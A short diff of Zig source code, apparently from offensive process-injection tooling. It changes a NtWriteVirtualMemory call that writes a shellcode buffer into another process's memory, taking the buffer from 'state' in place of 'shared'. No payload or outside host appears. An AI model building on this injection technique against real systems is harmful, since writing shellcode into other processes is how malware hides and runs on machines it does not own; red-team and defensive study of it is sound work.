@@ -17,8 +17,8 @@ pub export fn go(args: ?[*]u8, args_len: i32) callconv(.C) u8 {
     state.nt_status = w32.NtWriteVirtualMemory(
         state.process_handle,
         base_address,
-        shared.shellcode.ptr,
-        shared.shellcode.len,
+        state.shellcode.ptr,
+        state.shellcode.len,
         &bytes_written,
     );
 
